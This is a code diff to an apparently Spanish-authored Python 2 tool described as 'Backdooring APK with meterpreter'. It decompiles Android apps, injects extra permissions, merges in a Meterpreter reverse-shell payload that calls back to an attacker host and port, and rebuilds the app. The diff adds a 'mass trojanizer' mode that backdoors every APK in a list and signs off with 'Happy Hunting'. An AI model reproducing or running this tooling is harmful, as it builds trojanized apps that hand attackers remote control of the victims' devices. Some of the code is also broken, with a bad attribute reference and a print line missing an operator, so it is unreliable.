@@ -48,6 +48,9 @@ def generate_meterpreter(host,port):
 	handler.close()
 
 def inyeccion_permisos():
+	if not os.path.exists("permisos.xml"):
+		print "[!] Where it's permisos.xml?"
+		exit()
 	os.system("apktool d "+pwd+"/app-debug.apk -o "+pwd+"/app-debug-dir")
 	doc_manifest=open("app-debug-dir/AndroidManifest.xml","r")
 	doc_permisos=open("permisos.xml","r")
@@ -74,6 +77,9 @@ def inyeccion_permisos():
 	os.system("apktool b "+pwd+"/app-debug-dir -o "+pwd+"/app-debug-manifest.apk")
 
 def integracion_meterpreter():
+	if not os.path.exists("app-debug.apk"):
+		print "[!] Where it's app-debug.apk?"
+		exit()
 	os.system("d2j-dex2jar -f app-debug.apk")
 	os.system("d2j-jar2jasmin -f app-debug-dex2jar.jar")
 	os.system("d2j-dex2jar -f meterpreter.apk")
@@ -166,20 +172,50 @@ def remove_tmp_meterpreter():
 	os.system("rm meterpreter.apk")
 	print "[*] Temp files removed"
 
+def mass_trojanizer(): # Mass trojanizer module
+	if not os.path.exists("mass_trojans"):
+		os.system("mkdir mass_trojans")
+	if not os.path.exists("list_apk.txt"):
+		print "[!] Where it's list_apk.txt?"
+		exit()
+	list_orgin_apk=open("list_apk.txt","r")
+	read_list=list_orgin_apk.readlines()
+	list_orgin_apk.close()
+	for path in read_list:
+		string_path=lista_a_string(path.splitlines())
+		if not os.path.exists(string_path):
+			print "[!] Where it's "+string_path+"?"
+			exit()		
+		apk_name=string_path.split("/")[0::-1][0]
+		string_path_list=string_path.split("/")
+		del string_path_list[-1]
+		solo_rute=[]
+		for name_string_path in string_path_list:
+			solo_rute.append(name_string_path+"/")
+		solo_rute_string=lista_a_string(solo_rute)
+		os.system("cp "+string_path+" "+pwd+"/")
+		os.system("mv "+pwd+"/"+apk_name+" "+pwd+"/app-debug.apk")
+		inyeccion_permisos()
+		integracion_meterpreter()
+		remove_tmp_meterpreter()
+		os.system("mv "+pwd+"/app-debug.apk "+pwd+"/mass_trojans/"+apk_name)
+		print "[*] => "+pwd+"/mass_trojans/"+apk_name" created!"
+	print "[*] handler saved in => "+pwd+"/handler.rc"
+	print "[*] Happy Hunting"
+	exit()
+
 try:
 	parser = argparse.ArgumentParser(description='Backdooring APK with meterpreter')
 	parser.add_argument('-l','--lhost', help='LHOST select local host', required=True, dest='lhost')
-	parser.add_argument('-p','--lport', help='LPORT select local port', required=False, default='8443')
+	parser.add_argument('-p','--lport', help='LPORT select local port', required=False, default='443')
+	parser.add_argument('-m', '--mas-trojanizer', help='Massive trojanization module, you need edit file: list_apk.txt', action='store_true', default=False) # Mass trojanizer module
 	args=parser.parse_args()
 	host=args.lhost
 	port=args.lport
-	if not os.path.exists("permisos.xml"):
-		print "[!] Where it's permisos.xml?"
-		exit()
-	if not os.path.exists("app-debug.apk"):
-		print "[!] Where it's app-debug.apk?"
-		exit()
+	mass_trojan=args.mas-trojanizer # Mass trojanizer module
 	generate_meterpreter(host,port)
+	if mass_trojan: # Mass trojanizer module
+		mass_trojanizer() # Mass trojanizer module
 	inyeccion_permisos()
 	integracion_meterpreter()
 	remove_tmp_meterpreter()
@@ -189,4 +225,3 @@ try:
 except KeyboardInterrupt:
 	remove_tmp_meterpreter()
 	print "[!] Cancelled"
-
